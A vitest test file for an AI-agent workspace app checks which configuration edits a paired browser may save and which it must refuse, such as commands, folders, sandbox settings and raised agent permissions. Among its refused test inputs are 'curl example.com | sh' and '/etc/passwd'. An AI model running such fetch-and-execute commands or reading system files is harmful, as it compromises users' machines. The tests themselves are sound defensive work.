import { describe, expect, it, vi } from 'vitest';
import { neutralConfig } from '../src/shared/config';
import { newAgent } from '../src/shared/config/team';
import type { WorkspaceConfig } from '../src/shared/config/types';
import { WEB_EDITABLE, changedPaths, refusedPaths } from '../src/main/configScope';
import { webAccess } from '../src/main/webPolicy';
import { TEST_STAGES } from './helpers/config';

vi.mock('electron', () => ({ app: { getVersion: () => '0.0.0' }, BrowserWindow: { getFocusedWindow: () => null, getAllWindows: () => [] }, dialog: {} }));

// What a paired browser may change in the configuration: the team, the squads, the flow, the comment templates and the runner's plain settings, judged by the
// diff against the stored configuration, never by what the client says it changed.

const base = (): WorkspaceConfig => neutralConfig();
const edit = (change: (c: WorkspaceConfig) => void): WorkspaceConfig => {
  const c = structuredClone(base());
  change(c);
  return c;
};
const refused = (change: (c: WorkspaceConfig) => void): string[] => refusedPaths(base(), edit(change));

describe('the paths of a change', () => {
  it('names nothing for equal configurations, and the deepest object path for a change', () => {
    expect(changedPaths(base(), base())).toEqual([]);
    expect(changedPaths({ a: { b: 1, c: 2 } }, { a: { b: 1, c: 3 } })).toEqual(['a.c']);
  });

  it('takes an array or a scalar as one path, and a key that appears or disappears as its own path', () => {
    expect(changedPaths({ a: [1, 2] }, { a: [1, 3] })).toEqual(['a']);
    expect(changedPaths({ a: 1 }, { a: 1, b: 2 })).toEqual(['b']);
    expect(changedPaths({ a: 1, b: 2 }, { a: 1 })).toEqual(['b']);
    expect(changedPaths({ a: { x: 1 } }, { a: 'x' })).toEqual(['a']);
  });
});

describe('what a browser may change', () => {
  it('accepts the team, the squads, the flows, the comment templates and the priority', () => {
    expect(refused((c) => { c.agents.team[0].instructions = 'Be brief.'; c.agents.team[0].autonomous = !c.agents.team[0].autonomous; c.agents.team[0].permission = c.agents.team[0].permission === 'read' ? 'worktree' : 'read'; })).toEqual([]);
    expect(refused((c) => { c.squads = [{ id: 'core', name: 'Core', mission: 'x', scope: { repos: [], labels: [], paths: [], unclaimed: true }, liaison: null, autonomy: true, label: null }]; })).toEqual([]);
    expect(refused((c) => { c.devCycle.stages = [...c.devCycle.stages].reverse(); })).toEqual([]);
    expect(refused((c) => { c.devCycle.flows = { core: [...c.devCycle.stages] }; })).toEqual([]);
    expect(refused((c) => { c.devCycle.comments = { ...c.devCycle.comments, extra: { title: 'x', sections: [] } as never }; })).toEqual([]);
    expect(refused((c) => { c.devCycle.priority = { labels: ['^p0$'] }; })).toEqual([]);
  });

  it('saves a team that holds a draft agent of the assistant, and a draft is no path of its own', () => {
    const withDraft = (c: WorkspaceConfig): void => void c.agents.team.push(newAgent({ id: 'trial', name: 'Trial', draft: true }));
    const stored = edit(withDraft);
    // A change elsewhere in the team, with the draft as it was, is a change of the team only.
    const next = structuredClone(stored);
    next.agents.team[0].instructions = 'Be brief.';
    expect(refusedPaths(stored, next)).toEqual([]);
    // The mark is part of the team: clearing it gives the agent no power it did not have (its stages, squad and autonomy are what the team already allows).
    const promoted = structuredClone(stored);
    delete promoted.agents.team.find((a) => a.id === 'trial')!.draft;
    expect(refusedPaths(stored, promoted)).toEqual([]);
  });

  it('takes a flow\'s autonomy block only downwards: it may be turned off from the phone, never on', () => {
    const own = (c: WorkspaceConfig) => { c.devCycle.autonomy = { '': { useWorkspace: false, cycle: true, hostCommands: false, gates: true, push: false, pullRequest: false } }; };
    // Turning a field off, or the switch on, is allowed; raising any field, or handing the flow its own block, is not.
    expect(refused((c) => { own(c); })).toEqual(['devCycle.autonomy..cycle', 'devCycle.autonomy..gates', 'devCycle.autonomy..useWorkspace']);
    const withOwn = edit(own);
    expect(refusedPaths(withOwn, { ...withOwn, devCycle: { ...withOwn.devCycle, autonomy: { '': { useWorkspace: false, cycle: false, hostCommands: false, gates: false, push: false, pullRequest: false } } } })).toEqual([]);
    expect(refusedPaths(withOwn, { ...withOwn, devCycle: { ...withOwn.devCycle, autonomy: { '': { useWorkspace: false, cycle: true, hostCommands: true, gates: true, push: true, pullRequest: false } } } })).toEqual(['devCycle.autonomy..hostCommands', 'devCycle.autonomy..push']);
  });

  it('refuses the workspace autonomy block and its sandbox network by whole paths', () => {
    expect(refused((c) => { c.runner.autonomy = { cycle: true, hostCommands: true, gates: false, push: false, pullRequest: false, board: false }; })).toEqual(['runner.autonomy.cycle', 'runner.autonomy.hostCommands']);
    expect(refused((c) => { c.runner.sandbox = { ...c.runner.sandbox, network: 'open' }; })).toEqual(['runner.sandbox.network']);
  });

  it('refuses the board\'s autonomy choice by name, turned on or off', () => {
    expect(refused((c) => { c.runner.autonomy.board = true; })).toEqual(['runner.autonomy.board']);
    const on = edit((c) => { c.runner.autonomy.board = true; });
    expect(refusedPaths(on, edit((c) => { c.runner.autonomy.board = false; }))).toEqual(['runner.autonomy.board']);
  });

  it('accepts the runner switches, the label, the cap, the turns, the timeouts and the two message templates', () => {
    expect(refused((c) => { c.runner.enabled = true; c.runner.triggerLabel = 'go'; c.runner.maxConcurrentRuns = 3; c.runner.stageIdleMs = 1; c.runner.stageMaxMs = 2; c.runner.commitMessage = 'fix: {summary}'; c.runner.prTitle = '#{iid} {title}'; })).toEqual([]);
    expect(refused((c) => { c.runner.turns.write = 120; })).toEqual([]);
    expect(refused((c) => { c.runner.linkDependencies = false; })).toEqual([]);
  });

  it('refuses what names a program or a folder: the runner commands, the worktrees folder and the identity', () => {
    expect(refused((c) => { c.runner.commands = ['npm test']; })).toEqual(['runner.commands']);
    expect(refused((c) => { c.runner.worktreesDir = '~/elsewhere'; })).toEqual(['runner.worktreesDir']);
    expect(refused((c) => { c.runner.identity = { name: 'Dev', email: 'dev@example.com' }; })).toEqual(['runner.identity.name', 'runner.identity.email']);
  });

  it('refuses the only maintainer switch: whose yes stands for a review is the computer\'s to say', () => {
    expect(refused((c) => { c.runner.release = { soleMaintainer: true }; })).toEqual(['runner.release.soleMaintainer']);
  });

  it('refuses the learned procedures switch, turned on or off: only the computer decides what writes into a store other agents read', () => {
    expect(refused((c) => { c.runner.procedures = false; })).toEqual(['runner.procedures']);
    const off = edit((c) => { c.runner.procedures = false; });
    expect(refusedPaths(off, edit((c) => { c.runner.procedures = true; }))).toEqual(['runner.procedures']);
    // The switch is not in the editable list at all, so no path under it can be reached.
    expect(WEB_EDITABLE.some((p) => 'runner.procedures'.startsWith(p))).toBe(false);
  });

  it('lets a paired browser turn the shared memory on and off, and still refuses the roadmap pointer, which names a file of the computer', () => {
    expect(refused((c) => { c.runner.sharedMemory = false; })).toEqual([]);
    const off = edit((c) => { c.runner.sharedMemory = false; });
    expect(refusedPaths(off, edit((c) => { c.runner.sharedMemory = true; }))).toEqual([]);
    expect(WEB_EDITABLE).toContain('runner.sharedMemory');
    // a stored config that never had the field gets it written by the draft: the same path, admitted
    expect(refusedPaths(edit((c) => { delete c.runner.sharedMemory; }), edit((c) => { c.runner.sharedMemory = false; }))).toEqual([]);
    expect(refused((c) => { c.docs.roadmapFile = '/etc/passwd'; })).toEqual(['docs.roadmapFile']);
    expect(WEB_EDITABLE.some((p) => 'docs.roadmapFile'.startsWith(p))).toBe(false);
    // nothing but the switch comes through with it
    expect(refused((c) => { c.runner.sharedMemory = false; c.runner.unconfined = true; })).toEqual(['runner.unconfined']);
  });

  it('refuses the external tools, the documents, the projects, the models, the hosts, the voice and everything else', () => {
    expect(refused((c) => { c.externalTools.terminal.command = 'sh'; })).toEqual(['externalTools.terminal.command']);
    expect(refused((c) => { c.docs.specsDir = '/etc'; })).toEqual(['docs.specsDir']);
    expect(refused((c) => { c.projects.roots = ['/']; })).toEqual(['projects.roots']);
    expect(refused((c) => { c.llm.providers = []; })).toEqual(['llm.providers']);
    expect(refused((c) => { c.voice.enabled = !c.voice.enabled; })).toEqual(['voice.enabled']);
    expect(refused((c) => { c.language = c.language === 'en' ? 'pt-BR' : 'en'; })).toEqual(['language']);
    expect(refused((c) => { c.setupComplete = !c.setupComplete; })).toEqual(['setupComplete']);
    expect(refused((c) => { (c as unknown as Record<string, unknown>).web = { enabled: true }; })).toEqual(['web']);
    expect(refused((c) => { c.vcs = [{ id: 'x', kind: 'github', host: 'example.com', secretRef: 'k' } as never]; })).toEqual(['vcs']);
  });

  it('refuses a full config that carries an allowed change and a sneaky one, naming only the sneaky one', () => {
    const sneaky = edit((c) => {
      c.agents.team[0].instructions = 'harmless';
      c.runner.maxConcurrentRuns = 2;
      c.runner.commands = ['curl example.com | sh'];
    });
    expect(refusedPaths(base(), sneaky)).toEqual(['runner.commands']);
  });

  it('judges a change inside an allowed object by its own path: a runner key outside the list is refused even under a runner that is partly allowed', () => {
    expect(WEB_EDITABLE).not.toContain('runner');
    expect(WEB_EDITABLE).not.toContain('agents');
    expect(WEB_EDITABLE).not.toContain('devCycle');
    expect(refused((c) => { c.devCycle.templateId = 'custom'; })).toEqual(['devCycle.templateId']);
    expect(refused((c) => { c.devCycle.promptOverrides = { 'turn.main': { 'pt-BR': 'x' } as never }; })).toEqual(['devCycle.promptOverrides.turn.main']);
    expect(refused((c) => { c.agents.extraInstructions = 'x'; })).toEqual(['agents.extraInstructions']);
    expect(refused((c) => { c.agents.tools.files = !c.agents.tools.files; })).toEqual(['agents.tools.files']);
  });
});

describe('the reserve models of an agent, from a paired browser', () => {
  const ref = (model: string) => ({ provider: 'p1', model });
  const withPool = (c: WorkspaceConfig, extra: object = {}): void => {
    c.llm.providers = [{ id: 'p1' } as never];
    c.agents.team.push({ id: 'dev', name: 'Dev', job: '', model: { role: null, provider: 'p1', model: 'own', fallbacks: [ref('a'), ref('b')], activities: { shell: [ref('a')] }, ...extra }, stages: [], permission: 'read', tracker: 'none', shell: 'none', autonomous: false, turnsTo: null, instructions: '', system: false });
  };
  const stored = edit((c) => withPool(c));
  const next = (change: (a: WorkspaceConfig['agents']['team'][number]) => void): WorkspaceConfig => {
    const c = structuredClone(stored);
    change(c.agents.team.find((a) => a.id === 'dev')!);
    return c;
  };

  it('may take a reserve out, reorder the list and change the rest of the agent', () => {
    expect(refusedPaths(stored, next((a) => { a.model.fallbacks = [ref('b')]; }))).toEqual([]);
    expect(refusedPaths(stored, next((a) => { a.model.fallbacks = [ref('b'), ref('a')]; }))).toEqual([]);
    expect(refusedPaths(stored, next((a) => { delete a.model.fallbacks; delete a.model.activities; }))).toEqual([]);
    expect(refusedPaths(stored, next((a) => { a.instructions = 'Be brief.'; a.autonomous = true; }))).toEqual([]);
  });

  it('may not add a reserve to the list, or to the list of an activity, and the refusal names the agent and the list', () => {
    expect(refusedPaths(stored, next((a) => { a.model.fallbacks = [...a.model.fallbacks!, ref('c')]; }))).toEqual(['agents.team[dev].model.fallbacks']);
    expect(refusedPaths(stored, next((a) => { a.model.activities = { ...a.model.activities, edit: [ref('a')] }; }))).toEqual(['agents.team[dev].model.activities.edit']);
    expect(refusedPaths(stored, next((a) => { a.model.activities = { shell: [ref('a'), ref('c')] }; }))).toEqual(['agents.team[dev].model.activities.shell']);
  });

  it('may not make an agent that already has a pool, and may make one without', () => {
    const made = (extra: object) => edit((c) => { withPool(c, extra); c.agents.team[c.agents.team.length - 1].id = 'new'; });
    expect(refusedPaths(stored, made({}))).toEqual(['agents.team[new].model.fallbacks', 'agents.team[new].model.activities.shell']);
    expect(refusedPaths(stored, made({ fallbacks: undefined, activities: undefined }))).toEqual([]);
  });

  it('may not touch the pool of a role: the five of them are llm.roles, which the browser cannot change', () => {
    expect(refused((c) => { c.llm.roles.turn.fallbacks = [ref('a')]; })).toEqual(['llm.roles.turn.fallbacks']);
    expect(refused((c) => { c.llm.scoreOverrides = { floors: { shell: 1 } }; })).toEqual(['llm.scoreOverrides']);
  });
});

describe('what the provider offers, from a paired browser', () => {
  it('may not switch on or change a provider\'s features, a role\'s offer, the effort per activity or the flex tier', () => {
    expect(refused((c) => { c.llm.providers[0].features = { serviceTier: true, failFast: true }; })).toEqual(['llm.providers']);
    expect(refused((c) => { c.llm.effort = { shell: 'high' }; })).toEqual(['llm.effort']);
    expect(refused((c) => { c.llm.roles.deep.offer = { flex: true }; })).toEqual(['llm.roles.deep.offer']);
    expect(refused((c) => { c.runner.flex = false; })).toEqual(['runner.flex']);
  });

  it('may change the offer of an agent\'s own model, which reaches nothing without the provider\'s features', () => {
    const stored = edit((c) => { c.llm.providers = [{ id: 'p1' } as never]; c.agents.team.push(newAgent({ id: 'dev', model: { role: null, provider: 'p1', model: 'own' } })); });
    const next = structuredClone(stored);
    next.agents.team.find((a) => a.id === 'dev')!.model.offer = { flex: true, effort: true };
    expect(refusedPaths(stored, next)).toEqual([]);
  });
});

describe('the pool mode, from a paired browser', () => {
  it('may change the mode of an agent and of a stage: it reaches no tool the agent did not have', () => {
    expect(refused((c) => { c.agents.team[0].poolMode = 'fallback'; })).toEqual([]);
    expect(refused((c) => { c.agents.team[0].poolMode = 'delegate'; })).toEqual([]);
    const staged = (c: WorkspaceConfig) => { c.devCycle.stages = [structuredClone(TEST_STAGES[0])]; };
    const stored = edit(staged);
    const next = (change: (c: WorkspaceConfig) => void) => { const c = structuredClone(stored); change(c); return c; };
    expect(refusedPaths(stored, next((c) => { c.devCycle.stages[0].poolMode = 'switch'; }))).toEqual([]);
    expect(refusedPaths(stored, next((c) => { c.devCycle.flows = { core: [{ ...c.devCycle.stages[0], poolMode: 'switch' }] }; }))).toEqual([]);
  });

  it('may not change the workspace default, which sits in llm beside the pools it governs', () => {
    expect(refused((c) => { c.llm.poolMode = 'fallback'; })).toEqual(['llm.poolMode']);
    expect(refused((c) => { delete c.llm.poolMode; })).toEqual(['llm.poolMode']);
  });
});

describe('the channel', () => {
  // A confirmed test secret is handed to the next stage that takes the test environment: confirming or revoking one is the computer's, like the secrets.
  it('keeps confirming and revoking a test secret on the computer, and leaves the list of confirmations open', () => {
    expect(webAccess('config:testenv-confirm')).toBe('deny');
    expect(webAccess('config:testenv-revoke')).toBe('deny');
    expect(webAccess('config:testenv-confirmations')).toBe('allow');
  });

  it('is open to a paired browser while config:save stays refused by name', () => {
    expect(webAccess('config:cycle-save')).toBe('allow');
    expect(webAccess('config:save')).toBe('deny');
    expect(webAccess('config:saveCycle')).toBe('deny');
  });
});

describe('config:cycle-save, end to end', () => {
  async function handlers() {
    const { configModule } = await import('../src/main/configModule');
    const map = new Map<string, (...a: never[]) => unknown>();
    configModule({ handle: (ch, fn) => map.set(ch, fn), notify: () => {}, emit: () => {}, job: () => {} });
    const { saveConfig, getConfig } = await import('../src/main/workspaceConfig');
    saveConfig(neutralConfig());
    const call = (...a: unknown[]) => (map.get('config:cycle-save') as (...x: unknown[]) => unknown)(...a);
    return { call, getConfig, saveConfig };
  }

  it('saves a team change and refuses a sneaky one, leaving the stored config as it was', async () => {
    const { call, getConfig } = await handlers();
    const stored = structuredClone(getConfig());
    const ok = structuredClone(stored);
    ok.agents.team[0].instructions = 'Answer in two lines.';
    ok.runner.enabled = true;
    ok.runner.prTitle = '#{iid} {title}';
    call(ok);
    expect(getConfig().agents.team[0].instructions).toBe('Answer in two lines.');
    expect(getConfig().runner.enabled).toBe(true);
    expect(getConfig().runner.prTitle).toBe('#{iid} {title}');

    const sneaky = structuredClone(getConfig());
    sneaky.runner.commands = ['npm test'];
    sneaky.runner.maxConcurrentRuns = 2;
    expect(() => call(sneaky)).toThrow(/runner\.commands/);
    expect(getConfig().runner.commands).toBeNull();
    expect(getConfig().runner.maxConcurrentRuns).toBe(1);

    const tool = structuredClone(getConfig());
    tool.externalTools.terminal.command = 'sh';
    tool.docs.specsDir = '/etc';
    expect(() => call(tool)).toThrow(/docs\.specsDir, externalTools\.terminal\.command/);
    expect(getConfig().externalTools.terminal.command).toBeNull();
  });

  it('holds the change to the same validation as a desktop save, and refuses a document that is not a config', async () => {
    const { call, getConfig } = await handlers();
    const bad = structuredClone(getConfig());
    bad.runner.maxConcurrentRuns = 0;
    expect(() => call(bad)).toThrow(/runner\.maxConcurrentRuns/);
    expect(() => call({ runner: { commands: ['x'] } })).toThrow();
    expect(() => call('nope')).toThrow();
    expect(getConfig().runner.commands).toBeNull();
  });

  it('refuses a stale full config that would put back an old value of something the computer changed', async () => {
    const { call, getConfig, saveConfig } = await handlers();
    const stale = structuredClone(getConfig());
    const onComputer = structuredClone(stale);
    onComputer.runner.commands = ['npm test'];
    saveConfig(onComputer);
    stale.agents.team[0].instructions = 'x';
    expect(() => call(stale)).toThrow(/runner\.commands/);
    expect(getConfig().runner.commands).toEqual(['npm test']);
  });
});

describe('the two permissions of an agent, from a paired browser', () => {
  const withAgent = (shell: 'none' | 'allowlist' | 'sandbox', tracker: 'none' | 'read', permission: 'read' | 'worktree' = 'worktree'): WorkspaceConfig =>
    edit((c) => {
      c.agents.team.push({ id: 'dev', name: 'Dev', job: '', model: { role: 'deep', provider: '', model: '' }, stages: [], permission, tracker, shell, autonomous: false, turnsTo: null, instructions: '', system: false });
    });
  const agentOf = (c: WorkspaceConfig, change: (a: WorkspaceConfig['agents']['team'][number]) => void): WorkspaceConfig => {
    const next = structuredClone(c);
    change(next.agents.team.find((a) => a.id === 'dev')!);
    return next;
  };

  it('may lower them, and change what is not them', () => {
    const before = withAgent('sandbox', 'read');
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'none'; a.tracker = 'none'; }))).toEqual([]);
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'none'; a.instructions = 'x'; }))).toEqual([]);
    expect(refusedPaths(before, before)).toEqual([]);
  });

  it('may lower shell only to none: sandbox to the listed commands swaps one reach for another, and is refused', () => {
    const before = withAgent('sandbox', 'none');
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'allowlist'; }))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'none'; }))).toEqual([]);
    const listed = withAgent('allowlist', 'none');
    expect(refusedPaths(listed, agentOf(listed, (a) => { a.shell = 'none'; }))).toEqual([]);
  });

  it('may not raise them, and the refusal names the agent and the field', () => {
    const before = withAgent('none', 'none');
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'sandbox'; }))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'allowlist'; }))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, agentOf(before, (a) => { a.tracker = 'read'; }))).toEqual(['agents.team[dev].tracker']);
    const mid = withAgent('allowlist', 'none');
    expect(refusedPaths(mid, agentOf(mid, (a) => { a.shell = 'sandbox'; }))).toEqual(['agents.team[dev].shell']);
  });

  it('may make an agent that has neither, and not one that has either', () => {
    const before = base();
    expect(refusedPaths(before, withAgent('none', 'none'))).toEqual([]);
    expect(refusedPaths(before, withAgent('allowlist', 'none'))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, withAgent('none', 'read'))).toEqual(['agents.team[dev].tracker']);
  });

  describe('the screen, the hosts and the logged-in browser', () => {
    it('may lower them, and change what is not them', () => {
      const before = edit((c) => { c.agents.team.push(newAgent({ id: 'dev', screen: true, allowedHosts: ['example.com', 'docs.example.com'], browserProfile: true })); });
      expect(refusedPaths(before, agentOf(before, (a) => { a.screen = undefined; a.browserProfile = undefined; }))).toEqual([]);
      expect(refusedPaths(before, agentOf(before, (a) => { a.allowedHosts = ['example.com']; }))).toEqual([]);
      expect(refusedPaths(before, agentOf(before, (a) => { delete a.allowedHosts; }))).toEqual([]);
      expect(refusedPaths(before, agentOf(before, (a) => { a.instructions = 'x'; }))).toEqual([]);
    });

    it('may not raise them, and the refusal names the agent and the field', () => {
      const before = withAgent('none', 'none');
      expect(refusedPaths(before, agentOf(before, (a) => { a.screen = true; }))).toEqual(['agents.team[dev].screen']);
      expect(refusedPaths(before, agentOf(before, (a) => { a.browserProfile = true; }))).toEqual(['agents.team[dev].browserProfile']);
      expect(refusedPaths(before, agentOf(before, (a) => { a.allowedHosts = ['example.com']; }))).toEqual(['agents.team[dev].allowedHosts']);
      expect(refusedPaths(before, agentOf(before, (a) => { a.screen = true; a.browserProfile = true; a.allowedHosts = ['example.com']; }))).toEqual(['agents.team[dev].screen', 'agents.team[dev].allowedHosts', 'agents.team[dev].browserProfile']);
    });

    it('refuses a host added to a list that already has others, and one swapped for another', () => {
      const before = edit((c) => { c.agents.team.push(newAgent({ id: 'dev', allowedHosts: ['example.com'] })); });
      expect(refusedPaths(before, agentOf(before, (a) => { a.allowedHosts = ['example.com', 'docs.example.com']; }))).toEqual(['agents.team[dev].allowedHosts']);
      expect(refusedPaths(before, agentOf(before, (a) => { a.allowedHosts = ['docs.example.com']; }))).toEqual(['agents.team[dev].allowedHosts']);
    });

    it('may make an agent with none of them, and not one with any of them', () => {
      const made = (extra: Partial<Parameters<typeof newAgent>[0]>): WorkspaceConfig => edit((c) => { c.agents.team.push(newAgent({ id: 'dev', ...extra })); });
      expect(refusedPaths(base(), made({}))).toEqual([]);
      expect(refusedPaths(base(), made({ screen: true }))).toEqual(['agents.team[dev].screen']);
      expect(refusedPaths(base(), made({ allowedHosts: ['example.com'] }))).toEqual(['agents.team[dev].allowedHosts']);
      expect(refusedPaths(base(), made({ browserProfile: true }))).toEqual(['agents.team[dev].browserProfile']);
    });

    it('is not fooled by an agent that is turned on and renamed in the same save', () => {
      const before = edit((c) => { c.agents.team.push(newAgent({ id: 'dev' })); });
      expect(refusedPaths(before, agentOf(before, (a) => { a.name = 'Other'; a.screen = true; }))).toEqual(['agents.team[dev].screen']);
    });
  });

  it('may not touch the sandbox settings', () => {
    expect(refused((c) => { c.runner.sandbox.network = 'registry'; })).toEqual(['runner.sandbox.network']);
    expect(refused((c) => { c.runner.sandbox.readOnlyPaths = ['~/tools']; })).toEqual(['runner.sandbox.readOnlyPaths']);
    expect(refused((c) => { c.runner.sandbox.limits.memoryMb = 4096; })).toEqual(['runner.sandbox.limits.memoryMb']);
  });

  it('lets a paired browser read whether a sandbox can be made, and not start the check itself', () => {
    expect(webAccess('sandbox:status')).toBe('allow');
    expect(webAccess('sandbox:probe')).toBe('deny');
  });

  it('may not give an agent that runs commands the permission to change files: a reader\'s sandbox is a copy, a writer\'s is the worktree', () => {
    const before = withAgent('sandbox', 'none', 'read');
    expect(refusedPaths(before, agentOf(before, (a) => { a.permission = 'worktree'; }))).toEqual(['agents.team[dev].permission']);
    // With no commands, the permission to change files is what a browser could always give.
    const none = withAgent('none', 'none', 'read');
    expect(refusedPaths(none, agentOf(none, (a) => { a.permission = 'worktree'; }))).toEqual([]);
    // And taking it away is fine.
    const writer = withAgent('sandbox', 'none', 'worktree');
    expect(refusedPaths(writer, agentOf(writer, (a) => { a.permission = 'read'; }))).toEqual([]);
  });
});
